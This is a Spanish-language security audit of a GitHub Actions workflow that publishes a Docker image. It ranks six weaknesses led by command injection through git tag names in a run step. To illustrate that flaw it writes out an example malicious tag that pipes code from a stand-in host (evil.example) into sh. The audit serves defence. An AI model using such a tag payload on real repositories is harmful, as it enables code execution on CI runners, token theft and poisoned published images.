# Análisis de seguridad — `.github/workflows/container.yml`

**Archivo analizado:** `.github/workflows/container.yml`
**Herramienta:** Revisión manual asistida por Claude (Sonnet 5)
**Fecha:** 2026-09-04

Workflow de GitHub Actions que construye la imagen Docker del proyecto y la publica en GitHub Container Registry (`ghcr.io`) al hacer push a `master` o al crear un tag `vX.Y*`. Se identificaron las siguientes debilidades, ordenadas de mayor a menor gravedad.

---

## 🔴 Gravedad Alta

### 1. Inyección de comandos vía nombre de tag de git en el paso "Push image"
- **Ubicación:** `container.yml:26-31`
- **CWE:** CWE-78 (OS Command Injection) — patrón conocido como *"script/template injection"* en GitHub Actions
- **Explotable:** Sí, condicionado a que un atacante pueda crear/empujar un **tag** en el repositorio (no requiere acceso a `master`, solo permiso de push de tags, algo que suelen tener todos los colaboradores con acceso de escritura salvo que existan reglas de protección de tags).
- **Descripción:** GitHub Actions sustituye `${{ github.ref }}` **textualmente** en el script antes de que la shell lo interprete. La línea:
  ```sh
  VERSION=$(echo "${{ github.ref }}" | sed -e 's,.*/\(.*\),\1,')
  ```
  queda expandida a algo como `echo "refs/tags/<REF>"`. Aunque está entre comillas dobles, bash **sí evalúa `$(...)` y backticks dentro de comillas dobles**. El disparador del workflow acepta cualquier tag que haga match con el patrón `v[0-9]+.[0-9]+*` (glob, no regex estricta), y `git check-ref-format` permite caracteres como `$`, `` ` ``, `(`, `)`, `;` en nombres de ref. Un atacante con permiso de push de tags podría crear, por ejemplo:
  ```
  git tag 'v1.2.3$(curl -s https://evil.example/x|sh)'
  git push origin --tags
  ```
  y al expandirse `${{ github.ref }}` dentro de las comillas dobles del script, la subshell `$(curl ...|sh)` se ejecutaría en el runner **con el `GITHUB_TOKEN` con permiso `packages: write` disponible en el entorno**, permitiendo exfiltrar secretos, publicar imágenes maliciosas en `ghcr.io` suplantando al proyecto legítimo, o pivotar hacia otros recursos accesibles desde el runner.
- **Corrección recomendada:** nunca interpolar `${{ }}` directamente dentro de un bloque `run:`. Pasar el valor a través de una variable de entorno y referenciarla como `$VAR` (que la shell trata como dato, no como texto de script a sustituir):
  ```yaml
  env:
    GITHUB_REF: ${{ github.ref }}
  run: |
    VERSION=$(echo "$GITHUB_REF" | sed -e 's,.*/\(.*\),\1,')
  ```

---

## 🟠 Gravedad Media

### 2. Acciones de terceros no fijadas por hash de commit (riesgo de cadena de suministro)
- **Ubicación:** `container.yml:20`
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Explotable:** Condicional — requiere que la cuenta/repositorio de `actions/checkout` sea comprometido o que la etiqueta `v2` sea reapuntada a un commit malicioso.
- **Descripción:** `uses: actions/checkout@v2` referencia una etiqueta mutable, no un SHA de commit completo. Si el mantenedor de esa acción (o su cuenta) es comprometido, un atacante podría re-apuntar `v2` a un commit malicioso y este workflow lo ejecutaría automáticamente en el siguiente push, con acceso a `secrets.GITHUB_TOKEN`. Además, `v2` es una versión antigua sin actualizaciones de seguridad ni soporte del runtime de Node que usa.
- **Corrección recomendada:** fijar por SHA completo, p. ej. `actions/checkout@<sha-completo> # v4.x`, y usar Dependabot/Renovate para mantenerlo actualizado.

### 3. Interpolación directa de contexto (`github.actor`, `github.repository_owner`) en `run:`
- **Ubicación:** `container.yml:24`, `container.yml:27`
- **CWE:** CWE-78 (mismo patrón que el hallazgo #1, pero de menor severidad práctica)
- **Explotable:** Bajo en la práctica — GitHub restringe el charset de nombres de usuario (`github.actor`) y de organización/propietario, por lo que no admiten metacaracteres de shell. Aun así, es el mismo antipatrón inseguro.
- **Descripción:** `docker login ghcr.io -u ${{ github.actor }} --password-stdin` y `IMAGE_ID=ghcr.io/${{ github.repository_owner }}/$IMAGE_NAME` interpolan expresiones de contexto directamente en el script. Aunque hoy no son explotables por las restricciones de charset de GitHub, es una práctica insegura que debería corregirse por defensa en profundidad (mismo patrón que el hallazgo #1).

### 4. Publicación de imagen sin escaneo de vulnerabilidades ni firma/procedencia
- **Ubicación:** todo el job `docker` (`container.yml:11-37`)
- **CWE:** CWE-1104 (Use of Unmaintained Third-Party Components, aplicado a falta de control de la cadena de suministro) / CWE-345 (Insufficient Verification of Data Authenticity)
- **Explotable:** No es una vulnerabilidad directa, pero incrementa el impacto de cualquier compromiso (incluido el hallazgo #1): no hay paso de escaneo (p. ej. Trivy/Grype) antes de `docker push`, ni firma de la imagen (p. ej. cosign) ni generación de metadatos de procedencia (SLSA/provenance).
- **Descripción:** Una imagen con vulnerabilidades conocidas, o una imagen construida tras una inyección de comandos exitosa, se publicaría en el registro sin ningún control adicional que lo detenga.

---

## 🟡 Gravedad Baja

### 5. Sin `timeout-minutes` en el job
- **Ubicación:** `container.yml:11`
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Explotable:** Bajo — más un problema de robustez/costos que de seguridad directa, aunque un paso comprometido (p. ej. tras explotar el hallazgo #1) podría usarse para consumir minutos de CI indefinidamente.
- **Descripción:** El job no define un `timeout-minutes`, por lo que un paso colgado o abusado podría ejecutarse hasta el límite global de GitHub Actions (6 h por defecto).

### 6. Sin control de concurrencia (`concurrency`)
- **Ubicación:** `container.yml:10-11`
- **CWE:** CWE-362 (Race Condition), impacto menor
- **Explotable:** Bajo.
- **Descripción:** Si se disparan dos ejecuciones casi simultáneas (p. ej. push a `master` seguido rápidamente de un tag), ambas podrían pisarse al empujar el tag `latest`/`vX.Y.Z` en `ghcr.io`, dejando una imagen inconsistente publicada como la más reciente.

---

## ✅ Aspectos positivos (buenas prácticas ya presentes)

- El bloque `permissions:` (`packages: write`, `contents: read`) sigue el principio de mínimo privilegio en lugar de dejar el `GITHUB_TOKEN` con permisos por defecto más amplios.
- `docker login ... --password-stdin` evita exponer el token como argumento de línea de comandos (`-p`), que quedaría visible en la lista de procesos.
- El disparador es `push` (no `pull_request_target` ni `pull_request` desde forks), por lo que se evita la clase de vulnerabilidad "pwn request" típica de PRs externos con acceso a secretos.
- `${GITHUB_RUN_ID}` se referencia como variable de entorno de shell (`$GITHUB_RUN_ID`), no como expresión `${{ }}`, evitando correctamente la inyección en ese punto — es justo el patrón que falta aplicar a `github.ref`, `github.actor` y `github.repository_owner`.

---

## Resumen

| # | Debilidad | CWE | Gravedad | Explotable |
|---|---|---|---|---|
| 1 | Inyección de comandos vía nombre de tag (`github.ref`) | CWE-78 | Alta | Sí (requiere permiso de push de tags) |
| 2 | Acción de terceros sin fijar por SHA (`checkout@v2`) | CWE-829 | Media | Condicional (compromiso upstream) |
| 3 | Interpolación de `github.actor`/`repository_owner` en `run:` | CWE-78 | Media | Bajo (charset restringido) |
| 4 | Sin escaneo/firma de imagen antes de publicar | CWE-1104/345 | Media | Amplifica impacto de otros hallazgos |
| 5 | Sin `timeout-minutes` | CWE-400 | Baja | Bajo |
| 6 | Sin `concurrency` | CWE-362 | Baja | Bajo |

### Prioridad de corrección

El hallazgo **#1** es el crítico: es una inyección de comandos real y demostrable que, combinada con el permiso `packages: write` del `GITHUB_TOKEN`, permite a alguien con capacidad de crear tags ejecutar código arbitrario en el runner y comprometer la cadena de suministro del contenedor publicado. Corregirlo (pasar contextos por `env:` en vez de interpolarlos en `run:`) debería hacerse antes que cualquier otro ajuste. Los hallazgos **#2 y #3** son el mismo antipatrón aplicado de forma más defensiva, y **#4** reduce el radio de impacto si algo de lo anterior llegara a explotarse.
